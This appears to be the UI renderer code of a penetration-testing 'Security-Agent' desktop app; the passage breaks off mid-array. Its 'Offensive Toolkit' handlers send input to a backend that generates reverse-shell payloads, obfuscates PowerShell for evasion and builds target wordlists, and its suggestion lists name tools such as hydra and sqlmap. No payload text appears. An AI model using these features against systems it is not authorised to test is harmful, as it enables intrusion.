// ═══════════════════════════════════════════════════════════════════════════
// Security-Agent GUI — Renderer (UI logic)
// ═══════════════════════════════════════════════════════════════════════════

(function () {
    'use strict';

    const $ = (sel, ctx = document) => ctx.querySelector(sel);
    const $$ = (sel, ctx = document) => [...ctx.querySelectorAll(sel)];

    // ── Panel Navigation ──────────────────────────────────────────────────

    let currentPanel = 'dashboard';

    function switchPanel(panelId) {
        $$('.nav-item').forEach(btn => btn.classList.remove('active'));
        $$('.panel').forEach(p => p.classList.remove('active'));

        const navBtn = $(`.nav-item[data-panel="${panelId}"]`);
        const panel = $(`#panel-${panelId}`);
        if (navBtn) navBtn.classList.add('active');
        if (panel) {
            panel.classList.add('active');
            currentPanel = panelId;
        }
        const main = $('#main-content');
        if (main) main.scrollTop = 0;
    }

    $$('.nav-item[data-panel]').forEach(btn => {
        btn.addEventListener('click', () => switchPanel(btn.dataset.panel));
    });

    $$('.action-btn[data-panel]').forEach(btn => {
        btn.addEventListener('click', () => switchPanel(btn.dataset.panel));
    });

    // ── Output Helpers ────────────────────────────────────────────────────

    function setLoading(outputEl) {
        outputEl.innerHTML = '<span class="loading-text"><span class="spinner"></span> Running...</span>';
        outputEl.classList.remove('error');
    }

    function setResult(outputEl, data) {
        outputEl.classList.remove('error');
        outputEl.innerHTML = '';
        var stdout = (data.stdout || '').trim();
        var stderr = (data.stderr || '').trim();
        if (stdout) {
            var preOut = document.createElement('pre');
            preOut.className = 'output-stdout';
            preOut.textContent = stdout;
            outputEl.appendChild(preOut);
        }
        if (stderr) {
            var preErr = document.createElement('pre');
            preErr.className = 'output-stderr';
            preErr.textContent = stderr;
            outputEl.appendChild(preErr);
        }
        if (!stdout && !stderr) {
            outputEl.innerHTML = '<span class="empty-state">(no output)</span>';
        }
        if (!data.ok || data.exitCode !== 0) {
            outputEl.classList.add('error');
        }
    }

    function setEmpty(outputEl, msg) {
        outputEl.classList.remove('error');
        outputEl.innerHTML = '<span class="empty-state">' + msg + '</span>';
    }

    // ── Native Structured Output Rendering ────────────────────────────────

    function esc(s) {
        return String(s == null ? '' : s)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    }

    function nativeBadgeClass(severity) {
        return severity === 'high' ? 'badge-danger'
            : severity === 'medium' ? 'badge-warning'
            : severity === 'ok' ? 'badge-success'
            : 'badge-info';
    }

    function renderSection(section) {
        var el = document.createElement('div');
        el.className = 'native-section';

        // Engine emits { heading } while the older renderer schema used
        // { title }; accept both so every native tool renders correctly.
        var heading = section.title || section.heading;
        if (heading) {
            var h = document.createElement('div');
            h.className = 'native-section-title';
            h.textContent = heading;
            el.appendChild(h);
        }

        if (section.type === 'kv') {
            var kv = document.createElement('div');
            kv.className = 'native-kv';
            (section.rows || section.pairs || []).forEach(function (row) {
                var r = document.createElement('div');
                r.className = 'native-kv-row';
                var k = document.createElement('span');
                k.className = 'native-kv-key';
                k.textContent = row[0];
                var v = document.createElement('span');
                v.className = 'native-kv-value';
                v.textContent = row[1];
                r.appendChild(k);
                r.appendChild(v);
                kv.appendChild(r);
            });
            el.appendChild(kv);
        } else if (section.type === 'list') {
            var ul = document.createElement('ul');
            ul.className = 'native-list';
            (section.items || []).forEach(function (item) {
                var li = document.createElement('li');
                if (item.severity) {
                    var badge = document.createElement('span');
                    badge.className = 'badge ' + nativeBadgeClass(item.severity);
                    badge.textContent = item.severity.toUpperCase();
                    li.appendChild(badge);
                }
                var span = document.createElement('span');
                span.textContent = item.text || '';
                li.appendChild(span);
                ul.appendChild(li);
            });
            el.appendChild(ul);
        } else if (section.type === 'table') {
            var tbl = document.createElement('div');
            tbl.className = 'native-table';
            var head = document.createElement('div');
            head.className = 'native-tr native-th';
            (section.columns || []).forEach(function (col) {
                var c = document.createElement('span');
                c.className = 'native-td';
                c.textContent = col;
                head.appendChild(c);
            });
            tbl.appendChild(head);
            (section.rows || []).forEach(function (row) {
                var tr = document.createElement('div');
                tr.className = 'native-tr';
                row.forEach(function (cell) {
                    var c = document.createElement('span');
                    c.className = 'native-td';
                    c.textContent = cell;
                    tr.appendChild(c);
                });
                tbl.appendChild(tr);
            });
            el.appendChild(tbl);
        } else if (section.type === 'code') {
            var pre = document.createElement('pre');
            pre.className = 'native-code';
            pre.textContent = section.content || section.code || '';
            el.appendChild(pre);
        } else if (section.type === 'badges') {
            var bwrap = document.createElement('div');
            bwrap.className = 'native-badges';
            (section.badges || section.items || []).forEach(function (b) {
                var bd = document.createElement('span');
                bd.className = 'badge ' + nativeBadgeClass(b.severity);
                bd.textContent = b.label || b.text || '';
                bwrap.appendChild(bd);
            });
            el.appendChild(bwrap);
        }

        return el;
    }

    function setNativeResult(outputEl, result) {
        outputEl.classList.remove('error');
        if (!result.ok) {
            outputEl.classList.add('error');
            var err = document.createElement('div');
            err.className = 'native-error';
            err.textContent = result.error || result.subtitle || 'Tool failed';
            outputEl.innerHTML = '';
            outputEl.appendChild(err);
            return;
        }
        outputEl.innerHTML = '';
        var meta = document.createElement('div');
        meta.className = 'native-meta';
        meta.textContent = (result.subtitle || '') +
            (result.ms != null ? ' · ' + result.ms + ' ms · native' : '');
        outputEl.appendChild(meta);
        (result.sections || []).forEach(function (section) {
            outputEl.appendChild(renderSection(section));
        });
        if (!(result.sections || []).length) {
            outputEl.textContent = '(no output)';
        }
    }

    async function runNative(outputEl, toolId, args) {
        logUi('info', 'native run: ' + toolId);
        setLoading(outputEl);
        var result = await window.api.nativeRun(toolId, args);
        logUi(result.ok ? 'info' : 'error', 'native run complete: ' + toolId + ' ok=' + result.ok + (result.ms != null ? ' ' + result.ms + 'ms' : ''));
        setNativeResult(outputEl, result);
        addToolbar(outputEl);
    }

    // Fallback: when the native engine is unavailable (e.g. pure web), run
    // through the Rust binary as before.
    function runBinary(outputEl, args) {
        logUi('info', 'binary run: ' + (args || []).join(' '));
        setLoading(outputEl);
        window.api.runCommand(args).then(function (result) {
            logUi(result.ok ? 'info' : 'error', 'binary run complete: exit=' + result.exitCode);
            setResult(outputEl, result);
            addToolbar(outputEl);
        });
    }

    // ── Copy/Save Toolbar ─────────────────────────────────────────────────

    function ensureWrapper(outputEl) {
        let wrapper = outputEl.closest('.output-wrapper');
        if (!wrapper) {
            wrapper = document.createElement('div');
            wrapper.className = 'output-wrapper';
            outputEl.parentNode.insertBefore(wrapper, outputEl);
            wrapper.appendChild(outputEl);
        }
        return wrapper;
    }

    function addToolbar(outputEl) {
        const wrapper = ensureWrapper(outputEl);
        let toolbar = wrapper.querySelector('.output-toolbar');
        if (!toolbar) {
            toolbar = document.createElement('div');
            toolbar.className = 'output-toolbar';
            toolbar.innerHTML =
                '<button class="output-toolbar-btn" data-action="copy" title="Copy to clipboard">' +
                    '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>' +
                '</button>' +
                '<button class="output-toolbar-btn" data-action="save" title="Save to file">' +
                    '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>' +
                '</button>';
            wrapper.appendChild(toolbar);
        }

        var copyBtn = toolbar.querySelector('[data-action="copy"]');
        copyBtn.onclick = async function () {
            var text = outputEl.textContent || '';
            try {
                await navigator.clipboard.writeText(text);
                copyBtn.classList.add('copied');
                copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>';
                setTimeout(function () {
                    copyBtn.classList.remove('copied');
                    copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>';
                }, 1500);
            } catch (_e) {
                var textarea = document.createElement('textarea');
                textarea.value = text;
                textarea.style.position = 'fixed';
                textarea.style.opacity = '0';
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
            }
        };

        var saveBtn = toolbar.querySelector('[data-action="save"]');
        saveBtn.onclick = async function () {
            var text = outputEl.textContent || '';
            var filePath = await window.api.saveFile({
                filters: [{ name: 'Text', extensions: ['txt'] }, { name: 'All', extensions: ['*'] }]
            });
            if (filePath) {
                await window.api.writeFile(filePath, text);
            }
        };
    }

    // ── Dashboard ─────────────────────────────────────────────────────────

    async function loadDashboard() {
        var statusEl = $('#binary-status');
        var toolsEl = $('#tools-count');
        var skillsEl = $('#skills-count');
        var coverageEl = $('#coverage-status');
        var warningEl = $('#binary-warning');

        logUi('info', 'loadDashboard: checking binary + offline status...');

        try {
            var binPath = await window.api.getBinaryPath();
            if (binPath) {
                statusEl.textContent = 'Found';
                statusEl.style.color = 'var(--accent-green)';
                statusEl.title = 'security-agent: ' + binPath;
                if (warningEl) warningEl.style.display = 'none';
            } else {
                statusEl.textContent = 'Not Found';
                statusEl.style.color = 'var(--accent-red)';
                statusEl.title = 'security-agent binary not resolved — check the Verbose Logs (bottom bar).';
                if (warningEl) warningEl.style.display = 'flex';
            }
        } catch (_e) {
            statusEl.textContent = 'Error';
            statusEl.style.color = 'var(--accent-red)';
        }

        try {
            var result = await window.api.runCommand(['--offline-status']);
            if (result.ok) {
                var lines = result.stdout.split('\n');
                for (var i = 0; i < lines.length; i++) {
                    var line = lines[i];
                    if (line.startsWith('cataloged_tool_definitions=')) {
                        toolsEl.textContent = line.split('=')[1];
                    }
                    if (line.startsWith('embedded_skills=')) {
                        skillsEl.textContent = line.split('=')[1];
                    }
                    if (line.startsWith('capability_coverage=')) {
                        var val = line.split('=')[1];
                        if (val === 'ok') {
                            coverageEl.textContent = 'OK';
                            coverageEl.style.color = 'var(--accent-green)';
                        } else {
                            coverageEl.textContent = val;
                            coverageEl.style.color = 'var(--accent-orange)';
                        }
                    }
                }
            }
        } catch (_e) {
            // Dashboard shows -- values on failure
        }
    }

    // ── Online / Offline Mode Toggle ─────────────────────────────────────

    let agentMode = 'offline'; // default mode

    function setAgentMode(mode) {
        agentMode = mode;
        const offlineBtn = $('#mode-offline');
        const onlineBtn = $('#mode-online');
        if (mode === 'offline') {
            offlineBtn.classList.add('active');
            onlineBtn.classList.remove('active');
        } else {
            onlineBtn.classList.add('active');
            offlineBtn.classList.remove('active');
        }
        // Store preference
        try { localStorage.setItem('agent-mode', mode); } catch (_e) {}
        // Update subtitle
        const subtitle = $('#panel-dashboard .subtitle');
        if (subtitle) {
            subtitle.textContent = mode === 'online'
                ? 'Security-Agent orchestration overview — Online Mode'
                : 'Security-Agent orchestration overview — Offline Mode';
        }
    }

    // Restore saved preference
    try {
        const saved = localStorage.getItem('agent-mode');
        if (saved === 'online' || saved === 'offline') setAgentMode(saved);
    } catch (_e) {}

    // Wire up toggle buttons
    const modeToggle = $('#mode-toggle');
    if (modeToggle) {
        modeToggle.addEventListener('click', function (e) {
            const btn = e.target.closest('.mode-btn');
            if (btn && btn.dataset.mode) {
                setAgentMode(btn.dataset.mode);
            }
        });
    }

    // ── System Status ─────────────────────────────────────────────────────

    $('#btn-refresh-status').addEventListener('click', async function () {
        var output = $('#output-status');
        setLoading(output);
        var result = await window.api.runCommand(['--offline-status']);
        setResult(output, result);
        addToolbar(output);
    });

    // ── Run Tool ──────────────────────────────────────────────────────────

    $('#btn-browse-tool-input').addEventListener('click', async function () {
        var file = await window.api.selectFile();
        if (file) $('#tool-input-path').value = file;
    });

    $('#btn-browse-tool-output').addEventListener('click', async function () {
        var file = await window.api.saveFile({ filters: [{ name: 'Text', extensions: ['txt'] }] });
        if (file) $('#tool-output-path').value = file;
    });

    $('#btn-run-tool').addEventListener('click', async function () {
        var output = $('#output-tools');
        var name = $('#tool-name').value;
        var inputPath = $('#tool-input-path').value.trim();
        var outputPath = $('#tool-output-path').value.trim();

        if (!inputPath) {
            setEmpty(output, 'Please provide an input path.');
            return;
        }

        setLoading(output);
        var args = ['--run-tool', name, inputPath];
        if (outputPath) {
            args.push('--output', outputPath);
        }
        var result = await window.api.runCommand(args);
        setResult(output, result);
        addToolbar(output);
    });

    // ── Skills ────────────────────────────────────────────────────────────

    var allSkills = [];

    function renderSkills(filter) {
        var listEl = $('#skill-list');
        var filtered = filter
            ? allSkills.filter(function (s) { return s.toLowerCase().includes(filter.toLowerCase()); })
            : allSkills;

        listEl.innerHTML = '';
        filtered.forEach(function (name) {
            var btn = document.createElement('button');
            btn.className = 'skill-item';
            btn.textContent = name;
            btn.addEventListener('click', async function () {
                $$('.skill-item').forEach(function (b) { b.classList.remove('active'); });
                btn.classList.add('active');
                var detailEl = $('#skill-detail');
                setLoading(detailEl);
                var res = await window.api.runCommand(['--show-skill', name]);
                setResult(detailEl, res);
                addToolbar(detailEl);
            });
            listEl.appendChild(btn);
        });

        if (filtered.length === 0) {
            setEmpty(listEl, filter ? 'No matching skills.' : 'No skills found.');
        }
    }

    $('#btn-list-skills').addEventListener('click', async function () {
        var listEl = $('#skill-list');
        setLoading(listEl);

        var result = await window.api.runCommand(['--list-skills']);
        if (!result.ok) {
            setEmpty(listEl, 'Failed to load skills.');
            return;
        }

        allSkills = result.stdout.split('\n').filter(function (s) { return s.trim(); });
        renderSkills($('#skill-search').value);
    });

    $('#skill-search').addEventListener('input', function (e) {
        renderSkills(e.target.value);
    });

    // ── External Tool ─────────────────────────────────────────────────────

    $('#btn-run-external').addEventListener('click', async function () {
        var output = $('#output-external');
        var name = $('#ext-tool-name').value.trim();
        var argsStr = $('#ext-tool-args').value.trim();
        var allowNetwork = $('#ext-allow-network').checked;

        if (!name) {
            setEmpty(output, 'Please provide a tool name.');
            return;
        }

        setLoading(output);
        var args = ['--run-external-tool'];
        if (allowNetwork) args.push('--allow-network');
        args.push(name);
        if (argsStr) {
            args.push.apply(args, argsStr.split(/\s+/));
        }
        var result = await window.api.runCommand(args);
        setResult(output, result);
        addToolbar(output);
    });

    // ── Plan Scan ─────────────────────────────────────────────────────────

    $('#btn-browse-plan-config').addEventListener('click', async function () {
        var file = await window.api.selectFile();
        if (file) $('#plan-config-path').value = file;
    });

    $('#plan-execute').addEventListener('change', function (e) {
        $('#plan-execute-options').style.display = e.target.checked ? 'block' : 'none';
    });

    $('#btn-plan-scan').addEventListener('click', async function () {
        var output = $('#output-plan-scan');
        var config = $('#plan-config-path').value.trim();

        if (!config) {
            setEmpty(output, 'Please provide an engagement config path.');
            return;
        }

        setLoading(output);
        var args = ['--plan-scan', config];

        function addOpt(id, flag) {
            var val = $(id).value.trim();
            if (val) args.push(flag, val);
        }

        addOpt('#plan-audit-log', '--audit-log');
        addOpt('#plan-audit-db', '--audit-db');
        addOpt('#plan-memory', '--memory');
        addOpt('#plan-calibration-db', '--calibration-db');

        if ($('#plan-cognitive-review').checked) args.push('--cognitive-review');
        if ($('#plan-execute').checked) {
            if ($('#plan-allow-network').checked) args.push('--allow-network');
            args.push('--execute');
            var execArgs = $('#plan-exec-args').value.trim();
            if (execArgs) args.push.apply(args, execArgs.split(/\s+/));
        }

        var result = await window.api.runCommand(args);
        setResult(output, result);
        addToolbar(output);
    });

    // ── Record Findings ───────────────────────────────────────────────────

    $('#btn-browse-findings-dest').addEventListener('click', async function () {
        var file = await window.api.selectFile();
        if (file) $('#findings-dest').value = file;
    });

    $('#btn-browse-findings-src').addEventListener('click', async function () {
        var file = await window.api.selectFile();
        if (file) $('#findings-src').value = file;
    });

    $('#btn-record-findings').addEventListener('click', async function () {
        var output = $('#output-findings');
        var dest = $('#findings-dest').value.trim();
        var src = $('#findings-src').value.trim();

        if (!dest || !src) {
            setEmpty(output, 'Please provide both source and destination paths.');
            return;
        }

        setLoading(output);
        var result = await window.api.runCommand(['--record-findings', dest, src]);
        setResult(output, result);
        addToolbar(output);
    });

    // ── Schedule Retest ───────────────────────────────────────────────────

    $('#btn-browse-retest').addEventListener('click', async function () {
        var file = await window.api.selectFile();
        if (file) $('#retest-path').value = file;
    });

    $('#btn-schedule-retest').addEventListener('click', async function () {
        var output = $('#output-retest');
        var p = $('#retest-path').value.trim();
        if (!p) {
            setEmpty(output, 'Please provide a findings log path.');
            return;
        }
        setLoading(output);
        var result = await window.api.runCommand(['--schedule-retest', p]);
        setResult(output, result);
        addToolbar(output);
    });

    // ── View Audit Log ────────────────────────────────────────────────────

    $('#btn-browse-audit-log').addEventListener('click', async function () {
        var file = await window.api.selectFile();
        if (file) $('#audit-log-path').value = file;
    });

    $('#btn-view-audit').addEventListener('click', async function () {
        var output = $('#output-audit');
        var p = $('#audit-log-path').value.trim();
        if (!p) {
            setEmpty(output, 'Please provide an audit log path.');
            return;
        }
        setLoading(output);
        var result = await window.api.runCommand(['--view-audit', p]);
        setResult(output, result);
        addToolbar(output);
    });

    // ── View Audit Database ───────────────────────────────────────────────

    $('#btn-browse-audit-db').addEventListener('click', async function () {
        var file = await window.api.selectFile();
        if (file) $('#audit-db-path').value = file;
    });

    $('#btn-view-audit-db').addEventListener('click', async function () {
        var output = $('#output-audit-db');
        var p = $('#audit-db-path').value.trim();
        if (!p) {
            setEmpty(output, 'Please provide an audit database path.');
            return;
        }
        setLoading(output);
        var result = await window.api.runCommand(['--view-audit-db', p]);
        setResult(output, result);
        addToolbar(output);
    });

    // ── View Findings Database ────────────────────────────────────────────

    $('#btn-browse-findings-db').addEventListener('click', async function () {
        var file = await window.api.selectFile();
        if (file) $('#findings-db-path').value = file;
    });

    $('#btn-view-findings-db').addEventListener('click', async function () {
        var output = $('#output-findings-db');
        var p = $('#findings-db-path').value.trim();
        if (!p) {
            setEmpty(output, 'Please provide a findings database path.');
            return;
        }
        setLoading(output);
        var result = await window.api.runCommand(['--view-findings-db', p]);
        setResult(output, result);
        addToolbar(output);
    });

    // ── View Calibration Database ─────────────────────────────────────────

    $('#btn-browse-calibration-db').addEventListener('click', async function () {
        var file = await window.api.selectFile();
        if (file) $('#calibration-db-path').value = file;
    });

    $('#btn-view-calibration-db').addEventListener('click', async function () {
        var output = $('#output-calibration-db');
        var p = $('#calibration-db-path').value.trim();
        if (!p) {
            setEmpty(output, 'Please provide a calibration database path.');
            return;
        }
        setLoading(output);
        var result = await window.api.runCommand(['--view-calibration-db', p]);
        setResult(output, result);
        addToolbar(output);
    });

    // ── View Reasoning Log Database ───────────────────────────────────────

    $('#btn-browse-reasoning-db').addEventListener('click', async function () {
        var file = await window.api.selectFile();
        if (file) $('#reasoning-db-path').value = file;
    });

    $('#btn-view-reasoning-db').addEventListener('click', async function () {
        var output = $('#output-reasoning-db');
        var p = $('#reasoning-db-path').value.trim();
        if (!p) {
            setEmpty(output, 'Please provide a reasoning log database path.');
            return;
        }
        setLoading(output);
        var result = await window.api.runCommand(['--view-reasoning-log-db', p]);
        setResult(output, result);
        addToolbar(output);
    });

    // ── LLM Generate ──────────────────────────────────────────────────────

    $('#btn-llm-generate').addEventListener('click', async function () {
        var output = $('#output-llm-generate');
        var prompt = $('#llm-gen-prompt').value.trim();
        if (!prompt) {
            setEmpty(output, 'Please enter a prompt.');
            return;
        }
        setLoading(output);
        var result = await window.api.runCommand(['--llm-generate', prompt]);
        setResult(output, result);
        addToolbar(output);
    });

    // ── LLM Anomaly ──────────────────────────────────────────────────────

    $('#btn-llm-anomaly').addEventListener('click', async function () {
        var output = $('#output-llm-anomaly');
        var text = $('#llm-anomaly-text').value.trim();
        if (!text) {
            setEmpty(output, 'Please enter text to score.');
            return;
        }
        setLoading(output);
        var result = await window.api.runCommand(['--llm-perplexity', text]);
        setResult(output, result);
        addToolbar(output);
    });

    // ── Ask (NLU) with Streaming ──────────────────────────────────────────

    $('#btn-ask').addEventListener('click', async function () {
        var output = $('#output-ask');
        var input = $('#ask-input').value.trim();
        if (!input) {
            setEmpty(output, 'Please enter a question or instruction.');
            return;
        }

        setLoading(output);
        output.textContent = '';

        window.api.removeStreamListeners();
        window.api.onStreamChunk(function (chunk) {
            output.classList.remove('error');
            output.textContent += chunk;
            output.scrollTop = output.scrollHeight;
        });

        var result = await window.api.runStreaming(['--ask', input]);
        window.api.removeStreamListeners();

        if (!result.ok && result.exitCode !== 0) {
            output.classList.add('error');
            if (!output.textContent.trim()) {
                output.textContent = result.stderr || '(no output)';
            }
        }
        addToolbar(output);
    });

    // ── About ─────────────────────────────────────────────────────────────

    $('#btn-about').addEventListener('click', async function () {
        var output = $('#output-about');
        setLoading(output);
        var result = await window.api.runCommand(['--about']);
        setResult(output, result);
        addToolbar(output);
    });

    // ══════════════════════════════════════════════════════════════════════
    // Offensive Toolkit Handlers
    // ══════════════════════════════════════════════════════════════════════

    // ── Hash ID ───────────────────────────────────────────────────────────

    $('#btn-offensive-hash').addEventListener('click', async function () {
        var output = $('#output-offensive-hash');
        var hash = $('#offensive-hash-input').value.trim();
        if (!hash) { setEmpty(output, 'Enter a hash to identify.'); return; }
        runBinary(output, ['--hash-id', hash]);
    });

    // ── Password Strength ─────────────────────────────────────────────────

    $('#btn-offensive-password').addEventListener('click', async function () {
        var output = $('#output-offensive-password');
        var pw = $('#offensive-password-input').value.trim();
        if (!pw) { setEmpty(output, 'Enter a password to analyze.'); return; }
        runBinary(output, ['--password-strength', pw]);
    });

    // ── Gen Wordlist ──────────────────────────────────────────────────────

    $('#btn-offensive-wordlist').addEventListener('click', async function () {
        var output = $('#output-offensive-wordlist');
        var target = $('#offensive-wordlist-target').value.trim();
        if (!target) { setEmpty(output, 'Enter a target name.'); return; }
        var cli = ['--gen-wordlist', target];
        var company = $('#offensive-wordlist-company').value.trim();
        var year = $('#offensive-wordlist-year').value.trim();
        if (company) cli.push('--company', company);
        if (year) cli.push('--year', year);
        runBinary(output, cli);
    });

    // ── Gen Shell Payload ─────────────────────────────────────────────────

    $('#btn-offensive-shell').addEventListener('click', async function () {
        var output = $('#output-offensive-shell');
        var type = $('#offensive-shell-type').value;
        var lhost = $('#offensive-shell-lhost').value.trim();
        var lport = $('#offensive-shell-lport').value.trim();
        if (!lhost || !lport) { setEmpty(output, 'Enter LHOST and LPORT.'); return; }
        runBinary(output, ['--gen-shell', type, lhost, lport]);
    });

    // ── Analyze Payload ───────────────────────────────────────────────────

    $('#btn-offensive-payload').addEventListener('click', async function () {
        var output = $('#output-offensive-payload');
        var payload = $('#offensive-payload-input').value.trim();
        if (!payload) { setEmpty(output, 'Enter a payload to analyze.'); return; }
        runBinary(output, ['--analyze-payload', payload]);
    });

    // ── PS Obfuscation ───────────────────────────────────────────────────

    $('#btn-offensive-evasion').addEventListener('click', async function () {
        var output = $('#output-offensive-evasion');
        var cmd = $('#offensive-evasion-command').value.trim();
        if (!cmd) { setEmpty(output, 'Enter a PowerShell command.'); return; }
        runBinary(output, ['--obfuscate-ps', cmd]);
    });

    // ── Wireless Audit ────────────────────────────────────────────────────

    $('#btn-offensive-wireless').addEventListener('click', async function () {
        var output = $('#output-offensive-wireless');
        var essid = $('#offensive-wifi-essid').value.trim();
        var security = $('#offensive-wifi-security').value;
        var encryption = $('#offensive-wifi-encryption').value;
        if (!essid) { setEmpty(output, 'Enter an ESSID.'); return; }
        runBinary(output, ['--audit-wifi', essid, security, encryption]);
    });

    // ── Post-Exploit Analysis ─────────────────────────────────────────────

    $('#btn-offensive-postexploit').addEventListener('click', async function () {
        var output = $('#output-offensive-postexploit');
        var mode = $('#offensive-postexploit-mode').value;
        var input = $('#offensive-postexploit-input').value.trim();
        if (!input) { setEmpty(output, 'Provide file content or path.'); return; }
        // Route through the Rust-native CLI analyzers (owned by the app binary).
        var cli = (mode === 'sudoers') ? ['--analyze-sudoers', input] : ['--analyze-passwd', input];
        runBinary(output, cli);
    });

    // ── List Tools ──────────────────────────────────────────────────────

    $('#btn-list-tools').addEventListener('click', async function () {
        var output = $('#output-list-tools');
        setLoading(output);
        var result = await window.api.runCommand(['--list-tools']);
        if (!result.ok) {
            setResult(output, result);
            addToolbar(output);
            return;
        }
        var lines = result.stdout.split('\n').filter(function (l) { return l.trim(); });
        if (lines.length === 0) {
            setEmpty(output, 'No tools found.');
            return;
        }
        var table = document.createElement('div');
        table.className = 'tools-table';
        var header = document.createElement('div');
        header.className = 'tools-row tools-header';
        header.innerHTML = '<span class="tools-cell tools-name">Tool</span>' +
            '<span class="tools-cell tools-type">Type</span>' +
            '<span class="tools-cell tools-detail">Detail</span>';
        table.appendChild(header);
        lines.forEach(function (line) {
            var parts = line.split('\t');
            var row = document.createElement('div');
            row.className = 'tools-row';
            var name = parts[0] || '';
            var type = parts[1] || '';
            var detail = parts.slice(2).join('  ');
            row.innerHTML = '<span class="tools-cell tools-name">' + name + '</span>' +
                '<span class="tools-cell tools-type">' + type + '</span>' +
                '<span class="tools-cell tools-detail">' + detail + '</span>';
            table.appendChild(row);
        });
        output.innerHTML = '';
        output.classList.remove('error');
        output.appendChild(table);
        addToolbar(output);
    });

    // ── Gen Decoys ──────────────────────────────────────────────────────

    $('#btn-offensive-decoys').addEventListener('click', async function () {
        var output = $('#output-offensive-decoys');
        var realIp = $('#offensive-decoys-real-ip').value.trim();
        if (!realIp) { setEmpty(output, 'Enter a real IP address.'); return; }
        var cli = ['--gen-decoys', realIp];
        var count = $('#offensive-decoys-count').value.trim();
        if (count) cli.push(count);
        runBinary(output, cli);
    });

    // ── Analyze Handshake ───────────────────────────────────────────────

    $('#btn-offensive-handshake').addEventListener('click', async function () {
        var output = $('#output-offensive-handshake');
        var framesRaw = $('#offensive-handshake-frames').value.trim();
        if (!framesRaw) { setEmpty(output, 'Paste EAPOL hex frames.'); return; }
        var frames = framesRaw.split(/\s+/).filter(function (f) { return f.length > 0; });
        if (frames.length === 0) { setEmpty(output, 'Paste EAPOL hex frames.'); return; }
        runBinary(output, ['--analyze-handshake'].concat(frames));
    });

    // ── WPS PIN ─────────────────────────────────────────────────────────

    $('#btn-offensive-wps').addEventListener('click', async function () {
        var output = $('#output-offensive-wps');
        var pin = $('#offensive-wps-pin').value.trim();
        if (!pin) { setEmpty(output, 'Enter a WPS PIN.'); return; }
        setLoading(output);
        var result = await window.api.runCommand(['--wps-pin', pin]);
        setResult(output, result);
        addToolbar(output);
    });

    // ── Analyze Keys ────────────────────────────────────────────────────

    $('#btn-offensive-keys').addEventListener('click', async function () {
        var output = $('#output-offensive-keys');
        var input = $('#offensive-keys-input').value.trim();
        if (!input) { setEmpty(output, 'Provide file content or path.'); return; }
        setLoading(output);
        var result = await window.api.runCommand(['--analyze-keys', input]);
        setResult(output, result);
        addToolbar(output);
    });

    // ── Keyboard Shortcuts ────────────────────────────────────────────────

    document.addEventListener('keydown', function (e) {
        // Escape with an option box open only collapses the box — never
        // navigates away mid-selection.
        if (e.key === 'Escape' && activeCombo) {
            closeCombo();
            e.preventDefault();
            e.stopPropagation();
            return;
        }
        // Escape: go back to dashboard
        if (e.key === 'Escape') {
            switchPanel('dashboard');
        }
        // Ctrl/Cmd + K: focus the active panel's first input
        if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
            e.preventDefault();
            var activePanel = $('.panel.active');
            if (activePanel) {
                var firstInput = activePanel.querySelector('input[type="text"], textarea');
                if (firstInput) firstInput.focus();
            }
        }
        // Ctrl/Cmd + L: focus the search bar in skills panel
        if ((e.ctrlKey || e.metaKey) && e.key === 'l') {
            if (currentPanel === 'skills') {
                e.preventDefault();
                $('#skill-search').focus();
            }
        }
    });

    // ── Smart Option Combo Boxes ──────────────────────────────────────────
    //
    // Every free-text field in the app gets an in-place, scrollable option
    // box. It opens on click, focus or hover, filters as you type, supports
    // arrow-key navigation and Enter to select, and collapses on inactivity.

    var COMBO_OPTIONS = {
        // Run Tool / paths — NO curated entries for path fields: every
        // suggestion is a real, existing path from the dynamic scan
        // (see PATH_FIELDS + scanRealPaths). Kept keys document intent.
        'tool-input-path': [],
        'tool-output-path': [],
        'ext-tool-name': [
            'nmap', 'nikto', 'sqlmap', 'ffuf', 'feroxbuster', 'hydra', 'john',
            'hashcat', 'netexec', 'crackmapexec', 'nuclei', 'semgrep', 'grype', 'trivy'
        ],
        'ext-tool-args': [
            '-sV -p 1-1000 10.0.0.1', '-h', '--help', '--version', '-A -T4 target'
        ],
        // Plan Scan (config is key=value text, NOT JSON — see engagement_config.rs)
        'plan-config-path': [],
        'plan-audit-log': [],
        'plan-audit-db': [],
        'plan-memory': [],
        'plan-calibration-db': [],
        'plan-exec-args': ['--allow-network --execute', '--cognitive-review', '--audit-log ./audit.jsonl'],
        // Findings / Retest / Data panels
        'findings-dest': [],
        'findings-src': [],
        'retest-path': [],
        'audit-log-path': [],
        'audit-db-path': [],
        'findings-db-path': [],
        'calibration-db-path': [],
        'reasoning-db-path': [],
        // Intelligence
        'llm-gen-prompt': [
            'Summarize the findings in this audit log and suggest remediation priorities.',
            'Write a penetration testing report template for a web application assessment.',
            'Explain the MITRE ATT&CK framework in simple terms.',
            'Draft a security incident response playbook for a phishing attack.'
        ],
        'llm-anomaly-text': [
            'User logged in at 3:47 AM from a new device in a different country, then exfiltrated 2 GB of data.',
            'Normal application log entry: request completed in 42ms with status 200.',
            'Multiple failed sudo attempts followed by a successful root login during business hours.'
        ],
        'ask-input': [
            'What tools do you have?',
            'Are you healthy?',
            'Generate text about scanning',
            'How many skills are embedded?',
